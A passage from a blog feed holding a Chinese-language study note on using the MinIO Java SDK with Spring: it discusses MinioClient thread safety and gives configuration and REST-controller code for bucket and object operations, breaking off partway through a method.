      
      <category>Kafka 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring 整合 Minio</title>
    <link href="/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20%E6%95%B4%E5%90%88%20Minio/"/>
    <url>/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20%E6%95%B4%E5%90%88%20Minio/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-minio-核心-API"><a href="#1-minio-核心-API" class="headerlink" title="1. minio 核心 API"></a>1. minio 核心 API</h3><h3 id="2-MinioClient-线程安全问题"><a href="#2-MinioClient-线程安全问题" class="headerlink" title="2. MinioClient 线程安全问题"></a>2. MinioClient 线程安全问题</h3><p>关于 <strong>MinIO Client（MinIO Java SDK）</strong> 是否线程安全的问题，以下是详细分析：</p><hr><h3 id="3-官方文档的说明"><a href="#3-官方文档的说明" class="headerlink" title="3. 官方文档的说明"></a>3. <strong>官方文档的说明</strong></h3><p>根据 MinIO 官方文档和社区讨论，<strong>MinIO Java SDK 的 <code>MinioClient</code> 实例是线程安全的</strong>。这意味着：</p><ul><li>你可以将同一个 <code>MinioClient</code> 实例在多个线程中共享使用，无需额外的同步措施。</li><li>客户端内部的连接池、重试逻辑和网络请求处理都设计为线程安全，符合现代多线程应用的需求。</li></ul><p><strong>参考依据</strong>：</p><ul><li>MinIO 的官方 GitHub 仓库（<a href="https://github.com/minio/minio-java">https://github.com/minio/minio-java</a>）中，<code>MinioClient</code> 的文档和代码注释未提及线程安全性的限制，且其设计目标之一是支持高并发场景。</li><li>社区讨论（如 GitHub Issues 和技术博客）中普遍认为 <code>MinioClient</code> 是线程安全的，适合多线程环境。</li></ul><hr><h3 id="4-为什么-MinIO-Client-是线程安全的？"><a href="#4-为什么-MinIO-Client-是线程安全的？" class="headerlink" title="4. 为什么 MinIO Client 是线程安全的？"></a>4. <strong>为什么 MinIO Client 是线程安全的？</strong></h3><p>MinIO Client 的线程安全性主要依赖于以下设计：</p><ul><li><strong>无状态连接池</strong>：<code>MinioClient</code> 使用底层 HTTP 连接池（如 Apache HttpClient 或 OkHttp），这些连接池本身是线程安全的，支持并发请求。</li><li><strong>不可变配置</strong>：<code>MinioClient</code> 实例一旦创建，其配置（如 endpoint、accessKey、secretKey）是固定的，不会被修改，避免了竞态条件。</li><li><strong>同步&#x2F;异步方法分离</strong>：所有操作（如上传、下载、删除）都是同步或基于 Future&#x2F;Callback 的异步实现，内部已处理并发问题。</li></ul><hr><h3 id="5-使用建议"><a href="#5-使用建议" class="headerlink" title="5. 使用建议"></a>5. <strong>使用建议</strong></h3><p>尽管 <code>MinioClient</code> 是线程安全的，但在实际使用中仍需注意以下几点：</p><h4 id="5-1-✅-推荐做法"><a href="#5-1-✅-推荐做法" class="headerlink" title="5.1. ✅ 推荐做法"></a>5.1. ✅ <strong>推荐做法</strong></h4><ul><li><strong>单例模式</strong>：在应用中创建一个 <code>MinioClient</code> 实例并全局共享，避免重复创建开销。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MinioClient</span> <span class="hljs-variable">minioClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MinioClient</span>(<span class="hljs-string">&quot;https://play.min.io&quot;</span>, <span class="hljs-string">&quot;YOUR_ACCESS_KEY&quot;</span>, <span class="hljs-string">&quot;YOUR_SECRET_KEY&quot;</span>);<br><span class="hljs-comment">// 在多线程中共享此实例</span><br></code></pre></td></tr></table></figure></li><li><strong>合理配置连接池</strong>：通过自定义 HTTP 客户端调整连接池大小，以适应高并发场景。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()<br>    .connectionPool(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionPool</span>(<span class="hljs-number">10</span>, <span class="hljs-number">1</span>, TimeUnit.MINUTES))<br>    .build();<br><span class="hljs-type">MinioClient</span> <span class="hljs-variable">minioClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MinioClient</span>(<span class="hljs-string">&quot;https://play.min.io&quot;</span>, <span class="hljs-string">&quot;YOUR_ACCESS_KEY&quot;</span>, <span class="hljs-string">&quot;YOUR_SECRET_KEY&quot;</span>, httpClient);<br></code></pre></td></tr></table></figure></li></ul><h4 id="5-2-⚠️-需避免的问题"><a href="#5-2-⚠️-需避免的问题" class="headerlink" title="5.2. ⚠️ 需避免的问题"></a>5.2. ⚠️ <strong>需避免的问题</strong></h4><ul><li><strong>共享可变状态</strong>：如果业务逻辑中需要维护与 MinIO 操作相关的共享状态（如缓存、计数器），需自行加锁或使用线程安全的数据结构（如 <code>ConcurrentHashMap</code>）。</li><li><strong>异常处理</strong>：确保每个线程的 MinIO 操作独立处理异常，避免因单个线程失败影响整体流程。</li></ul><hr><h3 id="6-验证线程安全性的方法"><a href="#6-验证线程安全性的方法" class="headerlink" title="6. 验证线程安全性的方法"></a>6. <strong>验证线程安全性的方法</strong></h3><p>如果官方文档未明确说明，可以通过以下方式验证：</p><ol><li><strong>源码分析</strong>：<ul><li>检查 <code>MinioClient</code> 类的实现，确认其内部方法是否使用 <code>synchronized</code>、<code>ReentrantLock</code> 或无状态设计。</li><li>查看是否依赖线程安全的第三方库（如 Apache HttpClient）。</li></ul></li><li><strong>单元测试</strong>：<ul><li>编写多线程测试用例，同时执行上传、下载等操作，观察结果是否一致。</li><li>使用工具（如 JMeter）模拟高并发请求，检查是否存在资源竞争或死锁。</li></ul></li></ol><hr><h3 id="7-其他语言-SDK-的线程安全性"><a href="#7-其他语言-SDK-的线程安全性" class="headerlink" title="7. 其他语言 SDK 的线程安全性"></a>7. <strong>其他语言 SDK 的线程安全性</strong></h3><p>如果你使用的是其他语言的 MinIO SDK（如 Python、Node.js、Go），其线程安全性可能有所不同：</p><ul><li><strong>Go</strong>：<code>minio-go</code> SDK 是线程安全的，因为 Go 的 Goroutine 模型和 SDK 内部设计天然支持并发。</li><li><strong>Python</strong>：<code>minio</code> 库在单线程中是安全的，但在多线程中需注意全局解释器锁（GIL）的影响，建议使用异步（<code>asyncio</code>）或进程池。</li><li><strong>Node.js</strong>：基于事件循环的非阻塞设计，天然适合多线程（通过 <code>worker_threads</code>）。</li></ul><hr><h3 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. 总结</h3><p><strong>MinIO Java SDK 的 <code>MinioClient</code> 是线程安全的</strong>，适合在多线程环境中直接共享使用。但需注意：</p><ul><li>合理配置连接池以适应并发需求。</li><li>避免在客户端外部维护共享可变状态。</li><li>参考官方文档和源码，确认其他语言 SDK 的线程安全性。</li></ul><p>如果需要进一步验证，建议通过源码分析或编写多线程测试用例进行确认。</p><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h3><h5 id="1-1-1-创建-Spring-Web-项目"><a href="#1-1-1-创建-Spring-Web-项目" class="headerlink" title="1.1.1. 创建 Spring Web 项目"></a>1.1.1. 创建 Spring Web 项目</h5><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;：<ol><li>Spring Web</li></ol></li></ol><hr><h5 id="1-1-2-引入-Minio-相关依赖"><a href="#1-1-2-引入-Minio-相关依赖" class="headerlink" title="1.1.2. 引入 Minio 相关依赖"></a>1.1.2. 引入 Minio 相关依赖</h5><p>由于目前未提供 <code>**-minio-starter</code> 依赖，官方推荐的方式是直接添加  <a href="https://mvnrepository.com/artifact/io.minio/minio">minio 依赖</a> 依赖项。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.minio<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>minio<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="1-1-3-创建-Minio-配置类"><a href="#1-1-3-创建-Minio-配置类" class="headerlink" title="1.1.3. 创建 Minio 配置类"></a>1.1.3. 创建 Minio 配置类</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">@Configuration</span>  <br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MinioConfig</span> </span>&#123;  <br>      <br>    <span class="hljs-variable">@Bean</span>  <br>    public MinioClient minioClient() &#123;  <br>        <span class="hljs-keyword">return</span> MinioClient.builder()  <br>                .endpoint(<span class="hljs-string">&quot;192.168.136.8:9000&quot;</span>)  <br>                .credentials(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;admin123&quot;</span>)  <br>                .build();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="编写业务代码"><a href="#编写业务代码" class="headerlink" title="编写业务代码"></a>编写业务代码</h5><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MinioTest</span> &#123;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">public</span> MinioClient minioClient;  <br>  <br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/test&quot;</span>)</span>  <br>    <span class="hljs-keyword">public</span> String testMinio() &#123;  <br>        <span class="hljs-keyword">return</span> minioClient.toString();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="2-业务处理"><a href="#2-业务处理" class="headerlink" title="2. 业务处理"></a>2. 业务处理</h3><h4 id="创建-Bucket"><a href="#创建-Bucket" class="headerlink" title="创建 Bucket"></a>创建 Bucket</h4><h4 id="2-1-Bucket-基础操作"><a href="#2-1-Bucket-基础操作" class="headerlink" title="2.1. Bucket 基础操作"></a>2.1. Bucket 基础操作</h4><ol><li><code>minioClient.bucketExists(BucketExistsArgs args)</code>：<ol><li>用于检查指定名称的存储桶是否存在，返回一个布尔值</li><li>返回 <code>true</code> 表示该存储桶存在，返回 <code>false</code> 表示该存储桶不存在，常用于创建前的预检查</li></ol></li><li><code>minioClient.makeBucket(MakeBucketArgs args)</code>：<ol><li>创建一个新的存储桶，若该存储桶已存在则会抛出异常；方法无返回值（<code>void</code>）</li></ol></li><li><code>minioClient.listBuckets()</code>：<ol><li>用于列出当前用户有权限访问的所有存储桶，返回一个包含 <code>Bucket</code> 对象的列表；每个 <code>Bucket</code> 对象包含存储桶的名称和创建时间等信息</li></ol></li><li><code>minioClient.removeBucket(RemoveBucketArgs args)</code>：<ol><li>删除指定名称的存储桶；如果存储桶不存在，或不为空（即内部还有对象），则删除操作会抛出异常<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MinioTest</span> &#123;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">MinioClient</span> minioClient;  <br>  <br>    <span class="hljs-comment">// 1. minioClient.bucketExists(BucketExistsArgs args)  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/bucketExists&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">bucketExists</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> minioClient.<span class="hljs-title function_">bucketExists</span>(  <br>                <span class="hljs-title class_">BucketExistsArgs</span>.<span class="hljs-title function_">builder</span>().<span class="hljs-title function_">bucket</span>(bucketName).<span class="hljs-title function_">build</span>()  <br>            );  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>, <span class="hljs-string">&quot;查询存储桶时存在错误：&quot;</span> + e.<span class="hljs-title function_">getMessage</span>(),e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">// 2. minioClient.makeBucket(MakeBucketArgs args)  </span><br>    <span class="hljs-meta">@PostMapping</span>(<span class="hljs-string">&quot;/makeBucket&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">makeBucket</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            minioClient.<span class="hljs-title function_">makeBucket</span>(  <br>                <span class="hljs-title class_">MakeBucketArgs</span>.<span class="hljs-title function_">builder</span>().<span class="hljs-title function_">bucket</span>(bucketName).<span class="hljs-title function_">build</span>()  <br>            );  <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;存储桶：&quot;</span> + bucketName + <span class="hljs-string">&quot;创建成功&quot;</span>;  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>, <span class="hljs-string">&quot;创建存储桶时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">// 3. minioClient.listBuckets()  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/listBuckets&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">listBuckets</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> minioClient.<span class="hljs-title function_">listBuckets</span>().<span class="hljs-title function_">stream</span>()  <br>                .<span class="hljs-title function_">map</span>(bucket -&gt; bucket.<span class="hljs-title function_">name</span>() + <span class="hljs-string">&quot;---&quot;</span> + bucket.<span class="hljs-title function_">creationDate</span>()).<span class="hljs-title function_">collect</span>(<span class="hljs-title class_">Collectors</span>.<span class="hljs-title function_">toList</span>());  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                    <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>,  <br>                    <span class="hljs-string">&quot;列出存储桶时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">// 4. minioClient.removeBucket(RemoveBucketArgs args)  </span><br>    <span class="hljs-meta">@DeleteMapping</span>(<span class="hljs-string">&quot;/removeBucket&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">removeBucket</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            minioClient.<span class="hljs-title function_">removeBucket</span>(  <br>                <span class="hljs-title class_">RemoveBucketArgs</span>.<span class="hljs-title function_">builder</span>().<span class="hljs-title function_">bucket</span>(bucketName).<span class="hljs-title function_">build</span>()  <br>            );  <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;存储桶删除成功&quot;</span>;  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>, <span class="hljs-string">&quot;删除存储桶时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h4 id="2-2-Object-基础操作"><a href="#2-2-Object-基础操作" class="headerlink" title="2.2. Object 基础操作"></a>2.2. Object 基础操作</h4><ol><li><code>minioClient.putObject(PutObjectArgs args)</code>：<ol><li>上传文件到指定存储桶</li><li>如果上传成功，返回类型为 <code>void</code>（不返回内容）；如果出错会抛异常</li></ol></li><li><code>minioClient.statObject(StatObjectArgs args)</code>：<ol><li>用于检查指定的 Object 的状态</li><li>返回 <code>StatObjectResponse</code> 对象，包含：<ol><li>对象大小（size）</li><li>Content-Type</li><li>最后修改时间（lastModified）</li><li>ETag（内容摘要）</li><li>自定义元数据等信息</li></ol></li></ol></li><li><code>minioClient.getPresignedObjectUrl(GetPresignedObjectUrlArgs args)</code>：<ol><li>用于生成一个 Object 的签名 URL，以便通过 HTTP 访问</li><li>返回一个 <code>String</code> 类型的 URL，带有授权签名，支持临时访问私有资源</li></ol></li><li><code>minioClient.getObject(GetObjectArgs args)</code>：<ol><li>用于从指定的存储桶中下载文件</li><li>返回一个 <code>InputStream</code>，可以读取文件的内容流；需手动关闭流以释放资源</li></ol></li><li><code>minioClient.listObjects(ListObjectsArgs args)</code>：<ol><li>用于列出指定存储桶中的所有对象</li><li>返回一个 <code>Iterable&lt;Result&lt;Item&gt;&gt;</code>，每个 <code>Item</code> 表示一个对象，可通过 <code>item.objectName()</code> 获取对象名；注意：是惰性加载，适合处理大批量数据</li></ol></li><li><code>minioClient.removeObject(RemoveObjectArgs args)</code>：<ol><li>用于删除指定存储桶中的对象，需要指定存储桶名称和对象键</li><li>返回类型为 <code>void</code>，操作成功不返回内容；失败时抛出异常</li></ol></li></ol><p><img src="/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20%E6%95%B4%E5%90%88%20Minio/image-20250514084845465.png"><br><img src="/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20%E6%95%B4%E5%90%88%20Minio/image-20250514081937819.png"></p><p><img src="/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20%E6%95%B4%E5%90%88%20Minio/image-20250514081945868.png"></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MinioTest</span> &#123;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">MinioClient</span> minioClient;  <br>  <br>    <span class="hljs-comment">// 1. minioClient.putObject(PutObjectArgs args)  </span><br>    <span class="hljs-meta">@PostMapping</span>(<span class="hljs-string">&quot;/putObject&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params">  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> objectName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">MultipartFile</span> file</span>) &#123;  <br>        <span class="hljs-title function_">try</span> (<span class="hljs-title class_">InputStream</span> <span class="hljs-keyword">in</span> = file.<span class="hljs-title function_">getInputStream</span>()) &#123;  <br>            minioClient.<span class="hljs-title function_">putObject</span>(  <br>                <span class="hljs-title class_">PutObjectArgs</span>.<span class="hljs-title function_">builder</span>()  <br>                    .<span class="hljs-title function_">bucket</span>(bucketName)  <br>                    .<span class="hljs-title function_">object</span>(objectName)  <br>                    .<span class="hljs-title function_">stream</span>(<span class="hljs-keyword">in</span>, file.<span class="hljs-title function_">getSize</span>(), -<span class="hljs-number">1</span>)  <br>                    .<span class="hljs-title function_">contentType</span>(file.<span class="hljs-title function_">getContentType</span>())  <br>                    .<span class="hljs-title function_">build</span>()  <br>            );  <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功: &quot;</span> + objectName;  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                    <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>,  <br>                    <span class="hljs-string">&quot;上传文件时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>  <br>    <span class="hljs-comment">// 2. minioClient.statObject(StatObjectArgs args)  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/statObject&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">StatObjectResponse</span> <span class="hljs-title function_">statObject</span>(<span class="hljs-params">  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> objectName</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> minioClient.<span class="hljs-title function_">statObject</span>(  <br>                <span class="hljs-title class_">StatObjectArgs</span>.<span class="hljs-title function_">builder</span>()  <br>                    .<span class="hljs-title function_">bucket</span>(bucketName)  <br>                    .<span class="hljs-title function_">object</span>(objectName)  <br>                    .<span class="hljs-title function_">build</span>()  <br>            );  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                    <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>,  <br>                    <span class="hljs-string">&quot;获取对象状态时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">// 3. minioClient.getPresignedObjectUrl(GetPresignedObjectUrlArgs args)  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/getPresignedObjectUrl&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPresignedObjectUrl</span>(<span class="hljs-params">  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> objectName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span>(defaultValue = <span class="hljs-string">&quot;3600&quot;</span>) int expiry</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  